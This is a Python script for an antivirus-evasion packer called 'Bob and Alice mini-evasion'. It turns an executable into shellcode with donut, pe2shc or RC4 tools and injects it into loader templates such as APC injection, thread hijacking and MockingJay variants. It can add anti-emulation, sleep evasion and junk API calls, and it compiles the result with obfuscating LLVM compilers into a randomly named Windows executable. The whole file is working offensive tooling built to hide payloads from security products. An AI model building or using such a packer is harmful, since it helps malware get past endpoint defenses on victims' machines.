import argparse
import subprocess
import os
import re
import random
import string
import time

def check_non_negative(value):
    ivalue = int(value)
    if ivalue < 0:
        raise argparse.ArgumentTypeError("%s is an invalid non-negative int value" % value)
    return ivalue

def generate_random_filename(length=6):
    # Generate a random string of fixed length 
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# def generate_donut(input_exe, output_path):
#     # Run the donut tool with specified parameters
#     cmd = ['./donut', '-b1', '-f3', '-i', input_exe, '-o', output_path]
#     subprocess.run(cmd, check=True)


# def generate_shellcode(input_exe, output_path, shellcode_type):
#     if shellcode_type == 'donut':
#         cmd = ['./donut', '-b1', '-f3', '-i', input_exe, '-o', output_path]
#         subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
#     elif shellcode_type == 'pe2sh':
#         # Generate shellcode using pe2shc.exe
#         cmd = ['wine', 'pe2shc.exe', input_exe, output_path + ".bin"]
#         subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
#         # Process the generated shellcode to meet format requirements
#         process_cmd = ['python3', 'bin_to_c_array.py', output_path + ".bin", output_path]
#         subprocess.run(process_cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
#     else:
#         raise ValueError("Unsupported shellcode type.")

def generate_shellcode(input_exe, output_path, shellcode_type):
    if shellcode_type == 'donut':
        cmd = ['./donut', '-b1', '-f3', '-i', input_exe, '-o', output_path]
        subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    elif shellcode_type == 'pe2sh':
        # Generate shellcode using pe2shc.exe
        cmd = ['wine', 'pe2shc.exe', input_exe, output_path + ".bin"]
        subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # Process the generated shellcode to meet format requirements
        process_cmd = ['python3', 'bin_to_c_array.py', output_path + ".bin", output_path]
        subprocess.run(process_cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    elif shellcode_type == 'rc4':
        # First attempt with rc4_x64.exe
        cmd = ['wine', 'rc4_x64.exe', input_exe, output_path + ".bin", '-r']
        try:
            subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError:
            print("rc4_x64.exe failed; trying rc4_x86.exe...")
            # If rc4_x64.exe fails, try with rc4_x86.exe
            cmd = ['wine', 'rc4_x86.exe', input_exe, output_path + ".bin", '-r']
            subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # After trying with rc4_x64.exe and potentially rc4_x86.exe, check if the file was created
        if not os.path.exists(output_path + ".bin"):
            raise FileNotFoundError(f"The expected shellcode file {output_path + '.bin'} was not created.")
        
        # Process the generated shellcode to meet format requirements
        process_cmd = ['python3', 'bin_to_c_array.py', output_path + ".bin", output_path]
        subprocess.run(process_cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        raise ValueError("Unsupported shellcode type.")


def read_shellcode(file_path):
    with open(file_path, 'r') as file:
        content = file.read()
    # Extract the shellcode from the file content
    start = content.find('unsigned char buf[] = ') + len('unsigned char buf[] = ')
    end = content.rfind(';')
    shellcode = content[start:end].strip()
    return shellcode

### The below insert junk API function is working, but sometimes it insert the junk API to 
### a function inside debuger control flow. But in reality, you would not want your loader
### to have many control flow anyway. So, I will leave it as it is for now.
# def insert_junk_api_calls(content, junk_api):
#     if junk_api:
#         content = '#include "normal_api.h"\n' + content  # Add the include at the top

#         # Find the main function and identify possible insertion points
#         main_func_pattern = r'\bint\s+main\s*\([^)]*\)\s*\{'
#         match = re.search(main_func_pattern, content, re.MULTILINE)
#         if match:
#             start_pos = match.end()
#             end_pos = content.find('}', start_pos)  # Assuming no nested braces in main
#             if end_pos == -1:
#                 end_pos = len(content)

#             # Find all newline positions within main to determine potential insertion points
#             newlines = [pos for pos, char in enumerate(content[start_pos:end_pos]) if char == '\n']

#             if newlines:
#                 # Choose a random position from newlines to insert the executeAPIFunction call
#                 insert_pos = random.choice(newlines) + start_pos
#                 indentation = '    '  # Assuming standard indentation
#                 execute_call = f"\n{indentation}executeAPIFunction();"
#                 content = content[:insert_pos] + execute_call + content[insert_pos:]

#     return content

def insert_junk_api_calls(content, junk_api):
    if not junk_api:
        return content

    # Add the include statement at the top
    content = '#include "normal_api.h"\n' + content

    # Find the main function's scope
    main_func_pattern = r'\bint\s+main\s*\([^)]*\)\s*\{'
    match = re.search(main_func_pattern, content, re.MULTILINE)
    if match:
        start_pos = match.end()
        # Find the position of the closing brace for main, assuming no nested braces
        end_pos = content.rfind('}', start_pos)
        if end_pos == -1:
            end_pos = len(content)

        # Attempt to find "safe" lines by avoiding lines immediately following an opening brace or leading into a closing brace
        lines = content[start_pos:end_pos].split('\n')
        safe_lines = [i for i, line in enumerate(lines) if '{' not in line and '}' not in line and line.strip() != '']

        if safe_lines:
            # Choose a random line index from the safe ones, avoiding first and last line
            chosen_line_index = random.choice(safe_lines[1:-1])
            # Construct the modified content
            indentation = '    '  # Assuming standard indentation
            modified_line = f"{indentation}executeAPIFunction();\n{lines[chosen_line_index]}"
            lines[chosen_line_index] = modified_line

            # Reconstruct the content with the inserted call
            content = content[:start_pos] + '\n'.join(lines) + content[end_pos:]

    return content

def write_loader(loader_template_path, shellcode, output_path, sleep_flag, anti_emulation, junk_api):
    with open(loader_template_path, 'r') as file:
        content = file.read()

    # Insert junk API calls if the flag is set
    content = insert_junk_api_calls(content, junk_api)

    # Replace the placeholder with the actual shellcode
    content = content.replace('####SHELLCODE####', shellcode)

    # New: Insert anti-emulation code if the flag is set
    if anti_emulation:
        # Ensure #include "anti_emu.h" is added at the top of the file
        content = '#include "anti_emu.h"\n' + content

        # Find the position to insert executeAllChecksAndEvaluate();
        # This should be before the performSweetSleep(); if sleep_flag is also set
        main_func_pattern = r'\bint\s+main\s*\([^)]*\)\s*\{'
        match = re.search(main_func_pattern, content, re.MULTILINE)
        if match:
            insert_pos = match.end()
            newline_pos = content.find('\n', insert_pos)
            if newline_pos != -1:
                next_line_start = newline_pos + 1
                next_line_end = content.find('\n', next_line_start)
                next_line_content = content[next_line_start:next_line_end]
                indentation_match = re.match(r'\s*', next_line_content)
                indentation = indentation_match.group(0) if indentation_match else ''
                anti_emu_call_with_indentation = f"{indentation}executeAllChecksAndEvaluate();\n"
                content = content[:next_line_start] + anti_emu_call_with_indentation + content[next_line_start:]

    # Existing logic for inserting performSweetSleep(); remains unchanged...
    if sleep_flag:
        # Ensure #include "sweet_sleep.h" is added at the top of the file
        if '#include "sweet_sleep.h"' not in content:
            content = '#include "sweet_sleep.h"\n' + content

        # Use a regular expression to find the opening brace of the main function
        match = re.search(main_func_pattern, content, re.MULTILINE)
        if match:
            insert_pos = match.end()
            newline_pos = content.find('\n', insert_pos)
            if newline_pos != -1:
                next_line_start = newline_pos + 1
                next_line_end = content.find('\n', next_line_start)
                next_line_content = content[next_line_start:next_line_end]
                indentation_match = re.match(r'\s*', next_line_content)
                indentation = indentation_match.group(0) if indentation_match else ''
                sleep_call_with_indentation = f"{indentation}performSweetSleep();\n"
                # Ensure sleep call is added after anti-emulation call if both flags are set
                content = content[:next_line_start] + sleep_call_with_indentation + content[next_line_start:]

    # Write to the new loader file
    with open(output_path, 'w') as file:
        file.write(content)


def run_obfuscation(loader_path):
    # Predefine obf_file outside the try-except block to ensure it is accessible
    obf_file = loader_path.replace('.c', '_obf.c')
    patch_file = loader_path + '.patch'  # Also define patch_file here for consistency

    try:
        # subprocess.run(['sudo', 'bash', 'obfuscate_file.sh', loader_path], check=True)
        subprocess.run(['sudo', 'bash', 'obfuscate_file.sh', loader_path], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # Check if the patch file exists and rename it to obf_file
        if os.path.exists(patch_file):
            os.rename(patch_file, obf_file)
        else:
            print(f"Expected patch file not found: {patch_file}. Obfuscation may have failed.")
    except subprocess.CalledProcessError as e:
        print(f"Warning: Obfuscation step has some errors {e}. But do not worry, proceeding with the next steps.")
        # Since obf_file is now defined outside of the try block, it can be safely used here
        if os.path.exists(patch_file):
            os.rename(patch_file, obf_file)


def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulation, insert_junk_api_calls, mllvm_options=None):
    output_dir = os.path.dirname(output_name)
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    if compiler == "mingw":
        compile_command = ['x86_64-w64-mingw32-g++', '-static-libgcc', '-static-libstdc++', loader_path]
        # if sleep_flag:
        #     compile_command.append('./sweet_sleep.c')
        compile_command.extend(['-o', output_name])
    elif compiler == "pluto":
        # Default LLVM passes for Pluto, if any, can be specified here
        mllvm_passes = ','.join(mllvm_options) if mllvm_options else ""
        compile_command = ['./llvm_obfuscator_pluto/bin/clang++', '-O3', '-flto', '-fuse-ld=lld',
                           '-mllvm', f'-passes={mllvm_passes}',
                           '-Xlinker', '-mllvm', '-Xlinker', '-passes=hlw,idc',
                           '-target', 'x86_64-w64-mingw32', loader_path,
                           '-o', output_name, '-v', '-L/usr/lib/gcc/x86_64-w64-mingw32/12-win32',
                           '-L./clang_test_include', '-I./c++/', '-I./c++/mingw32/']
    elif compiler == "akira":
        # Default LLVM options for Akira
        default_akira_options = ['-irobf-indbr', '-irobf-icall', '-irobf-indgv', '-irobf-cse', '-irobf-cff']
        akira_options = mllvm_options if mllvm_options else default_akira_options
        compile_command = ['./akira_built/bin/clang++', '-target', 'x86_64-w64-mingw32', loader_path, '-o', output_name, '-v', '-L/usr/lib/gcc/x86_64-w64-mingw32/12-win32', '-L./clang_test_include', '-I./c++/', '-I./c++/mingw32/']
        for option in akira_options:
            compile_command.extend(['-mllvm', option])

    if anti_emulation:
        compile_command.extend(['./anti_emu.c', '-lws2_32', '-lpsapi'])
    if sleep_flag:
        # Assuming a sleep function implementation is available for both compilers
        compile_command.append('./sweet_sleep.c')
    if insert_junk_api_calls:
        compile_command.append('./normal_api.c')

    try:
        subprocess.run(compile_command, check=True)
        # subprocess.run(compile_command, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"\033[95m[+] Congratulations!\033[0m The packed binary has been successfully generated: \033[91m{output_name}\033[0m")
    except subprocess.CalledProcessError as e:
        print(f"[-] Compilation failed: {e}")


def cleanup_files(*file_paths):
    """Deletes specified files to clean up."""
    for file_path in file_paths:
        try:
            os.remove(file_path)
            # print(f"Deleted temporary file: {file_path}")
        except OSError as e:
            print(f"Error deleting temporary file {file_path}: {e}")


def main():

    print(r"""

    ██████╗░░█████╗░██████╗░  ░█████╗░███╗░░██╗██████╗░  ░█████╗░██╗░░░░░██╗░█████╗░███████╗
    ██╔══██╗██╔══██╗██╔══██╗  ██╔══██╗████╗░██║██╔══██╗  ██╔══██╗██║░░░░░██║██╔══██╗██╔════╝
    ██████╦╝██║░░██║██████╦╝  ███████║██╔██╗██║██║░░██║  ███████║██║░░░░░██║██║░░╚═╝█████╗░░
    ██╔══██╗██║░░██║██╔══██╗  ██╔══██║██║╚████║██║░░██║  ██╔══██║██║░░░░░██║██║░░██╗██╔══╝░░
    ██████╦╝╚█████╔╝██████╦╝  ██║░░██║██║░╚███║██████╔╝  ██║░░██║███████╗██║╚█████╔╝███████╗
    ╚═════╝░░╚════╝░╚═════╝░  ╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░  ╚═╝░░╚═╝╚══════╝╚═╝░╚════╝░╚══════╝

    ███████╗██╗░░░██╗░█████╗░░██████╗██╗░█████╗░███╗░░██╗  ████████╗░█████╗░░█████╗░██╗░░░░░
    ██╔════╝██║░░░██║██╔══██╗██╔════╝██║██╔══██╗████╗░██║  ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
    █████╗░░╚██╗░██╔╝███████║╚█████╗░██║██║░░██║██╔██╗██║  ░░░██║░░░██║░░██║██║░░██║██║░░░░░
    ██╔══╝░░░╚████╔╝░██╔══██║░╚═══██╗██║██║░░██║██║╚████║  ░░░██║░░░██║░░██║██║░░██║██║░░░░░
    ███████╗░░╚██╔╝░░██║░░██║██████╔╝██║╚█████╔╝██║░╚███║  ░░░██║░░░╚█████╔╝╚█████╔╝███████╗

    ▄▀█   █▀▀ █▄░█ █░█   █▀▄▀█ █ █▄░█ █ ▄▄ ▀█▀ █▀█ █▀█ █░░   █▄▄ █▄█   ▀█▀ ▀▄▀ █▀▄▀█
    █▀█   ██▄ █░▀█ █▄█   █░▀░█ █ █░▀█ █ ░░ ░█░ █▄█ █▄█ █▄▄   █▄█ ░█░   ░█░ █░█ █░▀░█

                                                            
    .@@@@@@&%#%                                             
    .@@@@@@@%#(                                             
    #@@@@@@@&#((                                            
   @@@@@@@@@&&%%%                                           
    %#%%@@@@%(/*,                               ..          
    %**,,,,*****.                          #%##((////(.     
     .//***//*/                          ,%%%##(((((((#(    
   .%&%%/,,,**(#%&,                       */(##########%.   
  &@@@&&%(//   *%&@#                      ********/%%%%%    
 &@@@&%%&%(/   *%&@&,.                     *//////#&&&&#    
.@@@&&%##&%#(/ /&&&&*.                  .*  ***/(#&&&#      
 @@@@&&%%%%&&%%%&&*               ((  .(    /***.   .,,*    
   *%&&&&&%#/,                    .//,(((/(%#/(.**,.*,,,*,  
                                 /**,,/(((#&&&%, *%*******. 
                                 ,//*/%(((%&(// ....,/**//. 
                                       (*((((/////////////. 
                                              .,*//**,                                                                                 
                                                                                

          
    """)
    print("Bob and Alice mini-evasion is starting...\n")
    time.sleep(0.5)  # Sleeps for 2 seconds


    # Extended description for loaders
    loaders_description = """
    12 loaders:
    1.  Sifu three finger death punch execution
    2.  APC test alert
    3.  API user land Hashing 
    4.  UUID manual injection
    5.  Remote mockingJay
    6.  Local thread hijacking 
    7.  Stealth local mockingJay
    8.  Ninja_syscall2 
    9.  RW local mockingJay
    10. Ninja syscall 1
    11. Sifu three finger death punch execution
    12. [Your custom loader here]
    14. Exit the process without executing the injected shellcode
    """

    parser = argparse.ArgumentParser(
        description='Process loader and shellcode.',
        epilog=loaders_description,
        formatter_class=argparse.RawDescriptionHelpFormatter 
    )

    parser.add_argument('-f', required=True, help='Path to binary.exe')
    parser.add_argument('-o', '--output-file', help='Optional: Specify the output file path and name. If not provided, a random file name will be used in the ./output directory.')

    parser.add_argument('-devide', action='store_true', help='Devide flag (True or False)')
    parser.add_argument('-l', '--loader', type=check_non_negative, default=1, help='Loader number (must be a non-negative integer)')

    parser.add_argument('-sleep', action='store_true', help='Sleep flag (True or False)')
    parser.add_argument('-a', '--anti-emulation', action='store_true', help='Anti-emulation flag (True or False)')
    parser.add_argument('-j', '--junk-api', action='store_true', help='Insert junk API function call at a random location in the main function (5 API functions)')

    parser.add_argument('-t', '--shellcode-type', default='donut', choices=['donut', 'pe2sh', 'rc4'], help='Shellcode generation tool: donut (default), pe2sh, or rc4')

    parser.add_argument('-c', '--compiler', default='mingw', choices=['mingw', 'pluto', 'akira'], help='Compiler choice: mingw (default), pluto, or akira')
    parser.add_argument('-mllvm', type=lambda s: [item.strip() for item in s.split(',')], default=None, help='LLVM passes for Pluto or Akira compiler')
    parser.add_argument('-obf', '--obfuscate', action='store_true', help='Enable obfuscation (optional)')


    args = parser.parse_args()

    # shellcode_file = 'note_donut' if args.shellcode_type == 'donut' else 'note_pe2sh'
    # Adjust shellcode_file name based on the shellcode type
    if args.shellcode_type == 'donut':
        shellcode_file = 'note_donut'
    elif args.shellcode_type == 'pe2sh':
        shellcode_file = 'note_pe2sh'
    elif args.shellcode_type == 'rc4':
        shellcode_file = 'note_rc4'
    else:
        # Default case, though this should never be hit due to argparse choices constraint
        shellcode_file = 'note_donut'

    generate_shellcode(args.f, shellcode_file, args.shellcode_type)

    shellcode = read_shellcode(shellcode_file)
    template_loader_path = f'loader_template_{args.loader}.c' if args.loader != 1 else 'loader1.c'
    output_loader_path = f'loader{args.loader}_modified.c' if args.loader != 1 else 'loader1_modified.c'
    write_loader(template_loader_path, shellcode, output_loader_path, args.sleep, args.anti_emulation, junk_api=args.junk_api)

    # run_obfuscation(output_loader_path)
    # compile_output(output_loader_path.replace('.c', '_obf.c'), os.path.join(args.o, 'bob.exe'))


    if args.obfuscate:
        run_obfuscation(output_loader_path)
        obfuscated_loader_path = output_loader_path.replace('.c', '_obf.c')
    else:
        # If obfuscation is not applied, use the original loader path
        obfuscated_loader_path = output_loader_path

    # Generate a random filename for the output executable
    # random_filename = generate_random_filename() + '.exe'
    # output_file_path = os.path.join(args.o, random_filename)
    # output_dir = ''  # Initialize output_dir

    # if args.output_file:
    #     output_file_path = args.output_file
    #     output_dir = os.path.dirname(output_file_path) or '.'  # Use '.' if output_dir is empty
    # else:
    #     # Default to './output' directory if -o is not provided
    #     output_dir = './output'
    #     if not os.path.exists(output_dir):
    #         os.makedirs(output_dir)  # Create the directory if it does not exist
    #     random_filename = generate_random_filename() + '.exe'
    #     output_file_path = os.path.join(output_dir, random_filename)

    # # Now, ensure the output directory exists before proceeding
    # if not os.path.exists(output_dir):
    #     os.makedirs(output_dir)

    if args.output_file:
        output_file_path = args.output_file
        output_dir = os.path.dirname(output_file_path) or '.'  # Use current directory if no directory is specified

        # The os.makedirs call with exist_ok=True ensures that the directory is created if it does not exist,
        # and does nothing if it already exists, preventing any FileNotFoundError
        os.makedirs(output_dir, exist_ok=True)
    else:
        # If no -o option is provided, use the ./output directory
        output_dir = './output'
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        # Generate a random filename for the output file
        random_filename = generate_random_filename() + '.exe'
        output_file_path = os.path.join(output_dir, random_filename)


    compile_output(obfuscated_loader_path, output_file_path, args.compiler, args.sleep, args.anti_emulation, args.junk_api, args.mllvm)
    # compile_output(output_loader_path.replace('.c', '_obf.c'), os.path.join(args.o, random_filename))
    # compile_output(output_loader_path.replace('.c', '_obf.c'), os.path.join(args.o, random_filename), args.sleep)


    # cleanup_files(output_loader_path, output_loader_path.replace('.c', '_obf.c'))



if __name__ == '__main__':
    main()












            #                     ,**///////**,                                   
            #              /@@@@@@@@@@@@@@@&&&%%%###%(                            
            #              @@@@@@@@@@@@@@@@&&&%%####&%                            
            #              @@@@@@@@@@@@@@@@@@&&%%##(((                            
            #              @@@@@@@@@@@@@@@@@@&&%%##(((                            
            #              @@@@@@@@@@@@@@@@@@&&%%##(((                            
            #              @@@@@@@@@@@@@@@@@@&&%%##(((                            
            #             (@@@@@@@@@@@@@@@@@@&&%%##(((&,                          
            #          #@@@@@@@@@@@@@@@@@@@@@@&%%###((###%,                       
            #         %@@@@@@@@@@@@@@@@@@@@@@@&&%#####%%%%%.                      
            #         ,@@@@@@@@@@@@@@@@@@@@@@@@&&&&&&%%%%%&                       
            #           /@@@@@@@@@@@@@@@@@@@@@@@@&&&&&&&&                         
            #           (@&&&@@@@@@@@@@@@@@@@@@@@@@&%####*                        
            #           (@@@@@&&&////////////((((#########                        
            #           *@@%#@@@&((///////((((((########%(                        
            #            #@%####((((((((((((((#######%##%                         
            #             .(%%%####################%%(#%                          
            #               .%%%%%#############%%%%((%/                           
            #                  #%%%%%%%%%%%%%%%#((%%#*.                           
            #                /%%%%(%%%%%####%%%%%#/,*%##%&(                       
            #            ,&&&&%%%%#%*,,,*/(((((#(,,#(/%##%&&@/                    
            #          %&&&@&&&&%%###%,,****,*%(#&&@@&###%%&@@@(                  
            #        %@@@@@@@@&&&%%%###(,@@@&@@&%*/#%#.##%%&@@@@&.                
            #      ,@@@@@@@@@&@&&&%%%##(#*%@*         .##%%&@@@@@&.               
            #     *@@@@@@@@@@&&&@&&%%%##(((.           ##%%&&@@@@@%               
            #    .@&@@@@@@@@&&&%%%&&%%%##((//          ##%%&&@@@@&@*...           
            #    &&@@@@@@@&&&&&%%%#&&&%%##(((/*        #%%%&&&@&&&&(.....         
            #   .@@@@@@@@@&&&&%%%####&&%%%##(((/,     .%%%&&&@@&&&&%....          
            #   ,@@@@@@@@@@&&&%%%#####%&&%%%##((((.   .%%&&&@&&&&&&#...           
            #   ,@@@@@@@@@@&&&%%%%%#####&&&%%%####((  .%&&&@&&&&&&/..             
            #   .@@@@@@@@@@&&&&%%%%%%%%%%%&&&%%%%%###/.&&@&&&&&&*..               
            #    (@@@@@@@@@@&&&&&%%%%%%%%%%%%&&&&%%%%%%@&&&&%*..                  
            #     .#@@@@@@@@&&&&&&%%%%%%%%%%%%%%%&%%&&&&/,.                       
            #       .,*#&@@@&&&&&&&&%%%%%%%%&&&&%(*...                            
            #             .,,**********,,...                                      
                                                    